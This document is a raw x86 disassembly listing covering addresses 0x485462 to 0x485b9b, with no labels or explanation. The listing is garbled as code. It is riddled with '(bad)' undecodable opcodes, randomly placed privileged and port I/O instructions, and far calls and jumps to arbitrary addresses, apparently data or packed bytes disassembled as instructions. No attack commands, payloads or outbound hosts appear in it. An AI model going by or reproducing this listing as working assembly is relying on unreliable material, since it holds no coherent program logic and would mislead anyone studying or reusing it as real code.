  485462:	imul   edx,DWORD PTR [edi-0x4b0e412],0xffffffd3
  485469:	dec    esi
  48546a:	outs   dx,BYTE PTR ds:[esi]
  48546b:	test   eax,0x444b48a1
  485470:	push   edi
  485471:	xor    BYTE PTR [esp+ebp*1],ch
  485474:	outs   dx,DWORD PTR ds:[esi]
  485475:	call   0x8358:0x36163983
  48547c:	sbb    ebx,eax
  48547e:	(bad)  
  48547f:	mov    bh,0x2
  485481:	(bad)  
  485482:	int3   
  485483:	mov    edx,0xee1f433f
  485488:	push   ebx
  485489:	sub    ebp,DWORD PTR [ecx+ebp*4-0x441cc6e1]
  485490:	ja     0x48549f
  485492:	pop    esp
  485493:	stos   DWORD PTR es:[edi],eax
  485494:	shr    DWORD PTR [ebx+0xe],cl
  485497:	or     edx,DWORD PTR [edi+ecx*1-0x2c]
  48549b:	in     al,0x46
  48549d:	aas    
  48549e:	jmp    ecx
  4854a0:	xchg   ecx,eax
  4854a1:	cli    
  4854a2:	shl    BYTE PTR [ecx],cl
  4854a4:	xchg   edi,eax
  4854a5:	mov    ebx,0x4ec20749
  4854aa:	inc    ebx
  4854ab:	retf   
  4854ac:	mov    ch,BYTE PTR [edi]
  4854ae:	sub    dl,BYTE PTR [edi+ecx*8]
  4854b1:	mov    bl,0xe
  4854b3:	xor    ebx,edx
  4854b5:	rcl    BYTE PTR [esi+0x7f386a38],cl
  4854bb:	xor    eax,0x583251b8
  4854c0:	aas    
  4854c1:	sti    
  4854c2:	pop    es
  4854c3:	xor    eax,DWORD PTR [eax-0x6068b4ac]
  4854c9:	aas    
  4854ca:	shl    BYTE PTR [edi+0x15],0xf7
  4854ce:	add    eax,DWORD PTR [esi+0xf]
  4854d1:	xor    DWORD PTR [edi],edi
  4854d3:	xor    eax,0x9da9dad8
  4854d8:	push   DWORD PTR [edi+0x25]
  4854db:	mov    WORD PTR [ebx],ss
  4854dd:	xchg   edi,eax
  4854de:	aas    
  4854df:	dec    esi
  4854e0:	lahf   
  4854e1:	adc    edx,DWORD PTR [esi]
  4854e3:	rcl    edx,1
  4854e5:	out    0x39,al
  4854e7:	aaa    
  4854e8:	dec    edi
  4854e9:	adc    eax,0x461c0c0a
  4854ee:	mov    bl,0x59
  4854f0:	lahf   
  4854f1:	aam    0x81
  4854f3:	retf   
  4854f4:	dec    edi
  4854f5:	popf   
  4854f6:	(bad)  
  4854f7:	dec    ebx
  4854f8:	call   0x6e8e18d8
  4854fd:	inc    esp
  4854fe:	push   0x33
  485500:	ss sub al,0x2b
  485503:	pop    es
  485504:	rol    BYTE PTR [ebp+ecx*1+0x532bb3ef],cl
  48550b:	outs   dx,DWORD PTR ds:[esi]
  48550c:	cli    
  48550d:	shr    BYTE PTR [eax-0x6d],0xc3
  485511:	mov    ss:0x15a6d1de,eax
  485517:	xlat   BYTE PTR ds:[ebx]
  485518:	jmp    DWORD PTR [edi]
  48551a:	push   es
  48551b:	aaa    
  48551c:	rol    BYTE PTR [esi-0x2c],cl
  48551f:	dec    ebp
  485520:	pop    ds
  485521:	inc    esi
  485522:	dec    edi
  485523:	push   edi
  485524:	jne    0x48559b
  485526:	outs   dx,BYTE PTR ds:[esi]
  485527:	xchg   edi,eax
  485528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485529:	pop    es
  48552a:	add    dh,BYTE PTR [ebx-0x44]
  48552d:	in     eax,0xdd
  48552f:	jne    0x4854e8
  485531:	xchg   DWORD PTR [edx],esi
  485533:	cs inc ebp
  485535:	daa    
  485536:	pop    ss
  485537:	mov    ebp,0x410e3c96
  48553c:	mov    ss,WORD PTR [edi+0x34]
  48553f:	test   DWORD PTR [ecx-0x73],edi
  485542:	inc    ebp
  485543:	outs   dx,DWORD PTR ds:[esi]
  485544:	dec    ebx
  485545:	inc    ebp
  485546:	jg     0x485529
  485548:	neg    BYTE PTR [eax-0x25]
  48554b:	(bad)  
  48554c:	pop    edi
  48554d:	inc    esp
  48554e:	pop    es
  48554f:	inc    edx
  485550:	and    eax,0x6702d116
  485555:	jg     0x485586
  485557:	add    eax,0x5fc29c73
  48555c:	inc    ebx
  48555d:	push   ecx
  48555e:	call   0x68139b9a
  485563:	xlat   BYTE PTR ss:[ebx]
  485565:	pop    eax
  485566:	scas   eax,DWORD PTR es:[edi]
  485567:	imul   esp,DWORD PTR [ecx],0x13
  48556a:	(bad)
  48556f:	sti    
  485570:	outs   dx,DWORD PTR ds:[esi]
  485571:	pop    ss
  485572:	jmp    0x4854fe
  485574:	pop    edx
  485575:	mov    eax,ds:0xad0affdf
  48557a:	ret    
  48557b:	inc    edx
  48557c:	inc    ebx
  48557d:	and    dh,BYTE PTR [edx]
  48557f:	xor    DWORD PTR [ebx],ebx
  485581:	test   BYTE PTR ds:0xa0efe35a,bl
  485587:	inc    edi
  485588:	sbb    al,0x52
  48558a:	mov    ds:0xc20dac67,eax
  48558f:	mul    BYTE PTR [edi]
  485591:	aaa    
  485592:	out    0x52,eax
  485594:	adc    dl,BYTE PTR cs:[esi+0x1f]
  485598:	scas   eax,DWORD PTR es:[edi]
  485599:	inc    ecx
  48559a:	push   esi
  48559b:	mov    cl,0x42
  48559d:	pop    ds
  48559e:	jae    0x48559f
  4855a0:	sti    
  4855a1:	mov    es,WORD PTR [edi+0x1b]
  4855a4:	push   cs
  4855a5:	and    DWORD PTR [ebx+0x63],0x34
  4855a9:	pop    ss
  4855aa:	add    BYTE PTR [edi+0x7],dl
  4855ad:	les    esi,FWORD PTR [edi+0x5f]
  4855b0:	adc    DWORD PTR [esi-0x2c68bd50],ecx
  4855b6:	xchg   DWORD PTR [ebp-0x6029c7eb],eax
  4855bc:	pop    edi
  4855bd:	loopne 0x4855e8
  4855bf:	inc    ebp
  4855c0:	pop    eax
  4855c1:	pop    ds
  4855c2:	addr16 ret 
  4855c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4855c5:	add    edx,DWORD PTR [ebx+0x7f45c602]
  4855cb:	call   0xbf4910ac
  4855d0:	pop    es
  4855d1:	sahf   
  4855d2:	sub    esp,DWORD PTR [esi+0x3fbb5d66]
  4855d8:	cmp    BYTE PTR [edi],al
  4855da:	scas   eax,DWORD PTR es:[edi]
  4855db:	inc    ebx
  4855dc:	cmp    al,0x5a
  4855de:	mov    bl,0xaf
  4855e0:	xor    eax,DWORD PTR [ebp-0x6c5b8f88]
  4855e6:	outs   dx,DWORD PTR ds:[esi]
  4855e7:	inc    esi
  4855e8:	xlat   BYTE PTR ds:[ebx]
  4855e9:	xchg   edi,eax
  4855ea:	(bad)  
  4855eb:	inc    ecx
  4855ec:	and    BYTE PTR [edi],ch
  4855ee:	pop    ds
  4855ef:	adc    eax,0xe76d0a3a
  4855f4:	mov    ds:0xf843ba7,eax
  4855f9:	mov    esp,0xb8ef27c7
  4855fe:	dec    ebp
  4855ff:	mov    al,BYTE PTR [ebp+0x7392637]
  485605:	xor    BYTE PTR [edx-0x1f],ah
  485608:	add    bl,BYTE PTR [edi-0x5]
  48560b:	mov    bh,0x9f
  48560d:	sub    DWORD PTR [ebp+0x4f3798c2],esi
  485613:	addr16 pop ebp
  485615:	mov    edx,0x32df59f4
  48561a:	push   DWORD PTR [edx]
  48561c:	pop    eax
  48561d:	ins    DWORD PTR es:[edi],dx
  48561e:	xchg   esi,eax
  48561f:	push   ss
  485620:	xlat   BYTE PTR ds:[ebx]
  485621:	pop    es
  485622:	xchg   BYTE PTR [esi-0x5d],cl
  485625:	jecxz  0x48563a
  485627:	lahf   
  485628:	(bad)  
  485629:	and    DWORD PTR cs:[ebp-0x382cea3a],ebx
  485630:	push   ss
  485631:	imul   eax,edx,0xcf37f771
  485637:	or     al,BYTE PTR [edi]
  485639:	mov    ebx,0xa71fb556
  48563e:	das    
  48563f:	xor    dl,BYTE PTR [ecx]
  485641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485642:	dec    edx
  485643:	div    DWORD PTR [ecx]
  485645:	stos   DWORD PTR es:[edi],eax
  485646:	xor    dl,ch
  485648:	adc    DWORD PTR [edi-0x40],edx
  48564b:	aas    
  48564c:	repz xchg ebp,eax
  48564e:	jne    0x4855fb
  485650:	mov    ah,0xb3
  485652:	adc    ebp,DWORD PTR [edx]
  485654:	mov    bl,0xa0
  485656:	aad    0xd6
  485658:	sar    DWORD PTR [ebx],0x43
  48565b:	push   ss
  48565c:	sbb    eax,0x97cbdabb
  485661:	or     eax,DWORD PTR [ecx+0x5b]
  485664:	ins    BYTE PTR es:[edi],dx
  485665:	mov    bh,0x1b
  485667:	xor    DWORD PTR cs:[edi],0x43
  48566b:	cmp    eax,DWORD PTR [ebp+0x27]
  48566e:	scas   al,BYTE PTR es:[edi]
  48566f:	js     0x4855fd
  485671:	scas   ax,WORD PTR es:[edi]
  485673:	push   esi
  485674:	out    dx,eax
  485675:	or     BYTE PTR ss:[edi],0xbd
  485679:	sub    edx,DWORD PTR [edi]
  48567b:	inc    ebx
  48567c:	xor    DWORD PTR [ebx-0xeb78be6],0xffffff8b
  485683:	aas    
  485684:	call   0x3219:0xa58385bb
  48568b:	xor    eax,edi
  48568d:	ja     0x4856e9
  48568f:	mov    esi,0x3736a79b
  485694:	xor    ecx,DWORD PTR [edx+0xb015573]
  48569a:	mov    eax,ds:0xa2c26fa3
  48569f:	add    eax,0x2fc3ceaf
  4856a4:	mov    al,0x93
  4856a6:	pop    eax
  4856a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4856a8:	mov    edi,0x878187c6
  4856ad:	cmp    edi,DWORD PTR [esi-0x14b9f889]
  4856b3:	and    cl,dl
  4856b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4856b6:	cmc    
  4856b7:	and    DWORD PTR [ebx-0x23b44951],0x66
  4856be:	jnp    0x4856ee
  4856c0:	arpl   WORD PTR [edi-0x4a22d87c],cx
  4856c6:	daa    
  4856c7:	push   esi
  4856c8:	mov    ebx,0x8a0443af
  4856cd:	fcomip st,st(7)
  4856cf:	stos   BYTE PTR es:[edi],al
  4856d0:	div    ah
  4856d2:	test   BYTE PTR [ebp-0x1],bl
  4856d5:	dec    edi
  4856d6:	adc    edi,DWORD PTR [ebx]
  4856d8:	or     ebx,DWORD PTR [eax+0x1d]
  4856db:	rcr    BYTE PTR [edi-0x68],0x62
  4856df:	bound  esi,QWORD PTR [ecx+0x41ff72bf]
  4856e5:	rcr    bl,0x25
  4856e8:	lods   al,BYTE PTR ds:[esi]
  4856e9:	out    0x7f,eax
  4856eb:	neg    DWORD PTR [edx]
  4856ed:	scas   al,BYTE PTR es:[edi]
  4856ee:	mov    al,0x3
  4856f0:	addr16 (bad) 
  4856f2:	minps  xmm4,XMMWORD PTR [ecx+0xc]
  4856f6:	les    ebp,FWORD PTR [edi]
  4856f8:	xor    esi,DWORD PTR [ebp+0x5a]
  4856fb:	jno    0x4856c2
  4856fd:	fidivr WORD PTR [ebx+0x35]
  485700:	and    ebp,DWORD PTR [edi-0x7c7705be]
  485706:	pop    es
  485707:	aas    
  485708:	sti    
  485709:	add    DWORD PTR [ebp+0x70],0x74
  48570d:	test   BYTE PTR [ebp-0x19],dl
  485710:	or     edi,DWORD PTR [ebx+0x316e926c]
  485716:	out    dx,eax
  485717:	push   ds
  485718:	jmp    DWORD PTR [eax-0x3f]
  48571b:	inc    ebp
  48571c:	ja     0x485785
  48571e:	xor    edx,edi
  485720:	cmp    BYTE PTR [ebx+0x4f],dl
  485723:	sub    DWORD PTR [esi+0x25],edx
  485726:	iret   
  485727:	mov    bh,0xff
  485729:	fsub   DWORD PTR [ecx-0x3878b749]
  48572f:	inc    edi
  485730:	xchg   esi,eax
  485731:	out    dx,eax
  485732:	loope  0x48573c
  485734:	fisttp WORD PTR [edi]
  485736:	daa    
  485737:	xor    al,0xe2
  485739:	dec    ebx
  48573a:	or     ecx,DWORD PTR [esi]
  48573c:	push   edi
  48573d:	pop    edi
  48573e:	(bad)  
  48573f:	aam    0xc5
  485741:	ret    0x6f62
  485744:	pop    ss
  485745:	ss ja  0x4856fd
  485748:	cmp    eax,0xffffffb7
  48574b:	add    eax,edi
  48574d:	push   ds
  48574e:	push   ebp
  48574f:	arpl   cx,dx
  485751:	or     dl,dl
  485753:	cmp    esi,DWORD PTR [edi-0x7b049fd5]
  485759:	mov    ebx,0xd5fbc334
  48575e:	les    edx,FWORD PTR [edx+0x9]
  485761:	es aaa 
  485763:	mov    bh,0x70
  485765:	cmp    ecx,DWORD PTR [esi+0x2e478781]
  48576b:	(bad)  
  48576c:	in     eax,dx
  48576d:	or     DWORD PTR [ebx],ebp
  48576f:	cmp    ebp,DWORD PTR [ebx+0x17]
  485772:	xor    al,0x22
  485774:	push   edi
  485775:	mov    al,ds:0x431f2f94
  48577a:	inc    esi
  48577b:	loope  0x4857c7
  48577d:	mov    edi,edx
  48577f:	or     edx,DWORD PTR [edi-0x3ea5c7ee]
  485785:	pop    es
  485786:	das    
  485787:	imul   ebp,DWORD PTR [edx+eax*8-0x45],0x9beb331f
  48578f:	or     DWORD PTR [ebx-0x78802e7c],ecx
  485795:	mov    ?,WORD PTR [esi+0x2]
  485798:	out    dx,al
  485799:	arpl   WORD PTR [ebx+0xc587f8f],di
  48579f:	in     al,dx
  4857a0:	add    al,0xd7
  4857a2:	daa    
  4857a3:	call   0x23cb46c0
  4857a8:	imul   ebx,DWORD PTR [edi],0xffffffba
  4857ab:	push   ebp
  4857ac:	jl     0x48580a
  4857ae:	xchg   DWORD PTR [edi+0x17],esp
  4857b1:	push   edx
  4857b2:	mov    ebx,0xa7ec42c2
  4857b7:	addr16 xchg edi,eax
  4857b9:	mov    dh,0x34
  4857bb:	jns    0x4857f8
  4857bd:	test   edi,edi
  4857bf:	push   es
  4857c0:	xor    edi,ebx
  4857c2:	rcl    bh,0xeb
  4857c5:	xlat   BYTE PTR ds:[ebx]
  4857c6:	inc    edx
  4857c7:	xchg   edi,eax
  4857c8:	stos   DWORD PTR es:[edi],eax
  4857c9:	push   ebx
  4857ca:	in     eax,dx
  4857cb:	dec    eax
  4857cc:	mov    eax,0xff061f05
  4857d1:	mov    eax,ebx
  4857d3:	pop    ebx
  4857d4:	je     0x48577e
  4857d6:	xor    edx,DWORD PTR [edi]
  4857d8:	pop    ss
  4857d9:	(bad)  
  4857da:	push   edx
  4857db:	add    ecx,0x571e378e
  4857e1:	mov    al,0x60
  4857e3:	push   esp
  4857e4:	add    al,0x3b
  4857e6:	jmp    0x4857c5
  4857e8:	inc    ecx
  4857e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4857ea:	pop    edx
  4857eb:	pop    edi
  4857ec:	ud0    esi,DWORD PTR [esi]
  4857ef:	mov    eax,0x6756a3d6
  4857f4:	retf   
  4857f5:	xchg   DWORD PTR [eax],esi
  4857f7:	sbb    ecx,DWORD PTR ss:[edi]
  4857fa:	ret    
  4857fb:	outs   dx,DWORD PTR ds:[esi]
  4857fc:	fild   DWORD PTR [ecx+0x37affacd]
  485802:	jmp    DWORD PTR [edx]
  485804:	loopne 0x4857c3
  485806:	push   esi
  485807:	sub    BYTE PTR [ebx+0x637c077e],0x1d
  48580e:	rcl    BYTE PTR [edx+0x5848747],1
  485814:	jp     0x485832
  485816:	xor    DWORD PTR [esi+0x3f],0x3c
  48581a:	aam    0xf2
  48581c:	icebp  
  48581d:	and    ecx,DWORD PTR [edx-0x3eb940ca]
  485823:	cmp    cl,BYTE PTR [ebp-0x5d38387c]
  485829:	fcmovne st,st(1)
  48582b:	(bad)  
  48582c:	xor    esi,DWORD PTR ds:[eax]
  48582f:	cmovb  ecx,ebx
  485832:	add    dl,BYTE PTR [esi+0x2c]
  485835:	ror    bh,cl
  485837:	ror    DWORD PTR [esi+0xfdd6bb4],cl
  48583d:	shl    DWORD PTR [edi],cl
  48583f:	push   esi
  485840:	loop   0x4857d4
  485842:	enter  0x70f,0x4f
  485846:	bound  edx,QWORD PTR [edi+0x39470375]
  48584c:	dec    edi
  48584d:	shl    BYTE PTR ds:0x415634b1,0x53
  485854:	push   esi
  485855:	or     eax,DWORD PTR [edi]
  485857:	pop    ss
  485858:	xchg   edi,eax
  485859:	inc    ebx
  48585a:	les    dx,DWORD PTR [bx+di]
  48585e:	loopne 0x48586e
  485860:	dec    ebx
  485861:	inc    esp
  485862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485863:	aaa    
  485864:	sar    BYTE PTR [edx+0x436f9148],1
  48586a:	cmc    
  48586b:	ror    BYTE PTR [ebp-0x54],cl
  48586e:	out    0xab,eax
  485870:	retf   
  485871:	aad    0xa5
  485873:	mov    ch,0x5d
  485875:	sbb    esi,DWORD PTR ds:0xf81fc30f
  48587b:	mov    DWORD PTR [edi+0x22],esp
  48587e:	daa    
  48587f:	push   edi
  485880:	xor    edi,DWORD PTR [esi+ebp*1-0x6c58eb53]
  485887:	sahf   
  485888:	mov    dh,0x15
  48588a:	fadd   DWORD PTR [edi+ebp*4-0x61]
  48588e:	mov    ds:0x95bc46,eax
  485893:	arpl   WORD PTR [ebx],ax
  485895:	(bad)  
  485896:	mov    ecx,0x9fc0c561
  48589b:	wrmsr  
  48589d:	mov    eax,0xd7c4ec67
  4858a2:	mov    bl,0xee
  4858a4:	xchg   ebx,eax
  4858a5:	jecxz  0x485901
  4858a7:	lods   al,BYTE PTR ds:[esi]
  4858a8:	repz adc al,BYTE PTR [edi+0x32]
  4858ac:	pop    esp
  4858ad:	and    dl,bl
  4858af:	xchg   BYTE PTR [ecx],dh
  4858b1:	pop    ss
  4858b2:	sub    esp,edi
  4858b4:	outs   dx,BYTE PTR ds:[esi]
  4858b5:	mov    bh,0x8b
  4858b7:	add    BYTE PTR [edi+0x37],bl
  4858ba:	inc    edi
  4858bb:	inc    esp
  4858bc:	dec    edi
  4858bd:	xor    bl,BYTE PTR [ebp+0xf]
  4858c0:	les    ecx,FWORD PTR [edx]
  4858c2:	scas   eax,DWORD PTR es:[edi]
  4858c3:	jmp    0x48588c
  4858c5:	jno    0x485898
  4858c7:	push   ebp
  4858c8:	and    DWORD PTR [edi+0x37],esi
  4858cb:	repz inc esi
  4858cd:	lods   al,BYTE PTR ds:[esi]
  4858ce:	mov    ebx,0xbb778a56
  4858d3:	or     BYTE PTR cs:[edi],0xd8
  4858d7:	jne    0x4858ec
  4858d9:	iret   
  4858da:	jg     0x485913
  4858dc:	outs   dx,DWORD PTR ds:[esi]
  4858dd:	cmp    eax,0xc6c1b6eb
  4858e2:	xor    ecx,DWORD PTR [edx-0x7f27b249]
  4858e8:	test   DWORD PTR [ebx],0x17f71744
  4858ee:	ds pusha 
  4858f0:	and    eax,0x38d7b380
  4858f5:	ret    0x6b1d
  4858f8:	es lahf 
  4858fa:	addr16 inc edx
  4858fc:	xchg   ebx,eax
  4858fd:	dec    eax
  4858fe:	lods   al,BYTE PTR ds:[esi]
  4858ff:	pop    ebp
  485900:	adc    DWORD PTR [bp+di],0x56
  485904:	popa   
  485905:	mov    ch,0xa7
  485907:	dec    edx
  485908:	cmp    edx,DWORD PTR [edi]
  48590a:	je     0x48595c
  48590c:	xlat   BYTE PTR ds:[ebx]
  48590d:	ret    0x9fd7
  485910:	jo     0x485903
  485912:	mov    BYTE PTR [ebx+0x5deb173f],ch
  485918:	jmp    0x8792ba9a
  48591d:	jecxz  0x485996
  48591f:	fdiv   QWORD PTR [esi+0x9]
  485922:	sbb    al,0x6f
  485924:	inc    ebx
  485925:	add    esi,DWORD PTR [esi]
  485927:	lahf   
  485928:	(bad)  
  485929:	fcom   DWORD PTR ds:0x4f033607
  48592f:	inc    edi
  485930:	mov    ds:0x763f0971,eax
  485935:	mov    bh,0x18
  485937:	mov    ds:0x73b5d83,al
  48593c:	mov    DWORD PTR [ecx+0x56],0xf33849b6
  485943:	xchg   ebx,eax
  485944:	aaa    
  485945:	adc    BYTE PTR cs:[ebp+0x38],0x67
  48594a:	aas    
  48594b:	inc    edi
  48594c:	jns    0x48596f
  48594e:	pusha  
  48594f:	and    DWORD PTR [edi],edx
  485951:	pop    ebx
  485952:	xor    al,0xc5
  485954:	and    BYTE PTR [ebp+0x49],bl
  485957:	dec    edi
  485958:	mov    bh,0x5b
  48595a:	add    esi,DWORD PTR [ecx-0x7f]
  48595d:	inc    edi
  48595e:	jg     0x4858fb
  485960:	cmp    ah,BYTE PTR [eax-0x190c383f]
  485966:	mov    edi,0x425d8d18
  48596b:	fistp  WORD PTR [edi-0x4bca3da4]
  485971:	push   ebx
  485972:	pop    ebx
  485973:	pop    ebx
  485974:	gs cmp al,0x62
  485977:	pop    edi
  485978:	xlat   BYTE PTR ds:[ebx]
  485979:	pop    es
  48597a:	push   cs
  48597b:	call   0xd8101ee2
  485980:	inc    edi
  485981:	add    eax,0xbb240070
  485986:	dec    edi
  485987:	rol    BYTE PTR [ecx],cl
  485989:	loopne 0x485967
  48598b:	cmpps  xmm1,xmm2,0x33
  48598f:	shl    BYTE PTR [ecx],0x3c
  485992:	push   0x33
  485994:	sbb    esi,DWORD PTR [esi]
  485996:	jge    0x48597a
  485998:	fsub   QWORD PTR [esi+0x47]
  48599b:	cmp    BYTE PTR [edi],dl
  48599d:	xor    BYTE PTR [edi+0xe],dh
  4859a0:	mov    esp,0x7f356f7
  4859a5:	aaa    
  4859a6:	outs   dx,DWORD PTR ds:[esi]
  4859a7:	mov    edi,0xc255d6fb
  4859ac:	pop    es
  4859ad:	xor    ah,BYTE PTR [ebx+0xf]
  4859b0:	sub    DWORD PTR [esi+0x7f07c169],0x39
  4859b7:	pop    ss
  4859b8:	inc    ebp
  4859b9:	stos   BYTE PTR es:[edi],al
  4859ba:	lods   eax,DWORD PTR ds:[esi]
  4859bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4859bc:	inc    ebx
  4859bd:	fiadd  WORD PTR [edx-0x21]
  4859c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4859c1:	adc    bl,BYTE PTR [eax]
  4859c3:	xchg   BYTE PTR [edi],bh
  4859c5:	pop    edx
  4859c6:	pop    ds
  4859c7:	inc    edx
  4859c8:	loope  0x485958
  4859ca:	jbe    0x485a38
  4859cc:	push   edi
  4859cd:	sti    
  4859ce:	xlat   BYTE PTR ds:[ebx]
  4859cf:	daa    
  4859d0:	jnp    0x485a4f
  4859d2:	arpl   WORD PTR [ebx],ax
  4859d4:	jg     0x4859f9
  4859d6:	(bad)  
  4859d7:	arpl   WORD PTR es:[ecx],ax
  4859da:	es iret 
  4859dc:	xor    dh,BYTE PTR [edi]
  4859de:	stos   DWORD PTR es:[edi],eax
  4859df:	aas    
  4859e0:	lea    esi,[edi+0x77cfc70a]
  4859e6:	inc    esi
  4859e7:	ficom  DWORD PTR [esi]
  4859e9:	dec    edi
  4859ea:	jp     0x485a53
  4859ec:	(bad)  
  4859ed:	loop   0x4859aa
  4859ef:	mov    esi,0x7b558d77
  4859f4:	jecxz  0x4859fd
  4859f6:	iret   
  4859f7:	inc    ebp
  4859f8:	pop    ds
  4859f9:	mov    edx,0x169b8eea
  4859fe:	push   DWORD PTR [ebx]
  485a00:	iret   
  485a01:	jecxz  0x4859e0
  485a03:	mov    ah,0x1a
  485a05:	lahf   
  485a06:	mov    bl,0x38
  485a08:	pop    edi
  485a09:	mov    DWORD PTR [ebx],0xd78f2230
  485a0f:	xor    edi,edx
  485a11:	pop    eax
  485a12:	adc    esi,DWORD PTR [eax+edi*1]
  485a15:	push   edi
  485a16:	mov    edi,0x85845a08
  485a1b:	neg    ebx
  485a1d:	push   ecx
  485a1e:	pop    eax
  485a1f:	and    BYTE PTR [edi+eiz*8+0x618e8b5f],ch
  485a26:	mov    cl,0xef
  485a28:	into   
  485a29:	mov    DWORD PTR [ecx-0x69],0x51ab818b
  485a30:	and    eax,DWORD PTR [ebx+esi*4-0x10]
  485a34:	inc    eax
  485a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485a36:	inc    eax
  485a37:	(bad)  
  485a38:	jg     0x485a5d
  485a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485a3b:	push   esi
  485a3c:	jno    0x485a5d
  485a3e:	pop    ss
  485a3f:	ud2    
  485a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485a42:	loopne 0x485a8f
  485a44:	xchg   edi,eax
  485a45:	lahf   
  485a46:	xor    al,0x97
  485a48:	or     BYTE PTR [ecx+eax*2],cl
  485a4b:	push   0xef38afbb
  485a50:	pop    eax
  485a51:	pop    ds
  485a52:	fmul   DWORD PTR [ebx+0x440e1bbb]
  485a58:	pop    esp
  485a59:	in     al,dx
  485a5a:	pop    ebx
  485a5b:	daa    
  485a5c:	inc    edx
  485a5d:	aas    
  485a5e:	ja     0x485a93
  485a60:	dec    eax
  485a61:	sbb    cl,al
  485a63:	rol    DWORD PTR es:[edi],cl
  485a66:	inc    ecx
  485a67:	arpl   WORD PTR [esi+0x7b43abb9],ax
  485a6d:	push   ss
  485a6e:	sbb    al,0x1d
  485a70:	jmp    0x4158:0xdff76bdf
  485a77:	in     al,dx
  485a78:	adc    BYTE PTR [edi+0x47],0x53
  485a7c:	push   0xfffffff2
  485a7e:	mov    bh,BYTE PTR [edi]
  485a80:	aaa    
  485a81:	cmp    edi,DWORD PTR [ecx]
  485a83:	jo     0x485a30
  485a85:	ss inc ecx
  485a87:	pop    ds
  485a88:	dec    edi
  485a89:	push   0xffffffb4
  485a8b:	or     edi,DWORD PTR [eax+0xb]
  485a8e:	out    0x47,eax
  485a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485a91:	cmp    al,BYTE PTR [esi]
  485a93:	adc    dl,BYTE PTR [edi+0xf1dfe7]
  485a99:	jl     0x485aff
  485a9b:	aas    
  485a9c:	movzx  eax,WORD PTR [edx+0x3d]
  485aa0:	popa   
  485aa1:	mov    ds:0xab3f2b0f,eax
  485aa6:	mov    WORD PTR [ebx-0x7c],fs
  485aa9:	imul   ebx,DWORD PTR [edi+0x692d0c58],0xe
  485ab0:	cmp    edi,esp
  485ab2:	rcr    BYTE PTR [ecx-0x702c351e],1
  485ab8:	xor    dl,dl
  485aba:	sbb    al,BYTE PTR [ecx+0x5687d785]
  485ac0:	loopne 0x485b03
  485ac2:	xchg   edi,eax
  485ac3:	sti    
  485ac4:	aas    
  485ac5:	outs   dx,DWORD PTR ds:[esi]
  485ac6:	stos   DWORD PTR es:[edi],eax
  485ac7:	ja     0x485ace
  485ac9:	cmp    eax,0x2717b72e
  485ace:	jo     0x485aa5
  485ad0:	sub    cl,BYTE PTR [eax-0x54be14a1]
  485ad6:	jle    0x485ae1
  485ad8:	cdq    
  485ad9:	pop    ds
  485ada:	(bad)  
  485adb:	xor    al,0xb7
  485add:	(bad)  
  485ade:	rcl    DWORD PTR ds:0x53370270,1
  485ae4:	lds    ebp,FWORD PTR [edx+0x7faf95a7]
  485aea:	add    DWORD PTR [edx+0x69],0xffffff90
  485aee:	mov    eax,0x9a8a9fa9
  485af3:	pop    ecx
  485af4:	pop    ds
  485af5:	mov    ch,0x8b
  485af7:	cmp    esi,DWORD PTR [edi+ebp*1]
  485afa:	inc    esp
  485afb:	xor    eax,0x2fac381c
  485b00:	inc    ebx
  485b01:	out    dx,eax
  485b02:	das    
  485b03:	jmp    0x3827091a
  485b08:	stos   DWORD PTR es:[edi],eax
  485b09:	pop    edi
  485b0a:	pop    esi
  485b0b:	inc    ebx
  485b0c:	cwde   
  485b0d:	dec    eax
  485b0e:	mov    al,ds:0x7e34521
  485b13:	pop    edx
  485b14:	jge    0x485afe
  485b16:	imul   ecx,DWORD PTR [edi+0x9b8cf42],0xffffffa9
  485b1d:	sbb    edi,DWORD PTR [edi+0x3eae35cf]
  485b23:	mov    al,0xd2
  485b25:	dec    edi
  485b26:	jmp    0x485b8a
  485b28:	inc    ebx
  485b29:	dec    esp
  485b2a:	fidivr WORD PTR [ecx]
  485b2c:	dec    esp
  485b2d:	mov    bl,0xaa
  485b2f:	div    BYTE PTR [esi]
  485b31:	or     DWORD PTR [esi+edx*8+0x713fbb62],ebp
  485b38:	stos   DWORD PTR es:[edi],eax
  485b39:	in     eax,0x75
  485b3b:	mov    edi,0xf972ef5f
  485b40:	cli    
  485b41:	(bad)  
  485b42:	xchg   edi,eax
  485b43:	xchg   ebx,eax
  485b44:	pop    ss
  485b45:	mov    esi,0x819a4a37
  485b4a:	aaa    
  485b4b:	pop    edi
  485b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  485b4d:	xor    DWORD PTR [edi*4+0x62cf44bb],ecx
  485b54:	ret    
  485b55:	in     al,dx
  485b56:	fsub   DWORD PTR [eax-0x10f590a5]
  485b5c:	iret   
  485b5d:	or     DWORD PTR [edi+0x1bbb2baf],esi
  485b63:	mov    ds:0x8c9f4332,eax
  485b68:	je     0x485bd1
  485b6a:	out    dx,eax
  485b6b:	xor    DWORD PTR [esi],edi
  485b6d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485b6f:	adc    eax,0x36fb77e7
  485b74:	adc    BYTE PTR [edx],cl
  485b76:	(bad)  
  485b77:	add    eax,DWORD PTR [edi]
  485b79:	jne    0x485b2b
  485b7b:	fstp   TBYTE PTR [eax+0x229fbf03]
  485b81:	add    cl,BYTE PTR [ebx]
  485b83:	jo     0x485b78
  485b85:	out    0x7f,eax
  485b87:	add    bh,BYTE PTR [edx+eiz*2]
  485b8a:	ror    ebx,1
  485b8c:	ja     0x5c6cae12
  485b92:	bound  esi,QWORD PTR [edi-0x450f0f88]
  485b98:	outs   dx,DWORD PTR ds:[esi]
  485b99:	sub    ebp,DWORD PTR [edx]
  485b9b:	sub    eax,DWORD PTR [ebp+0x16]
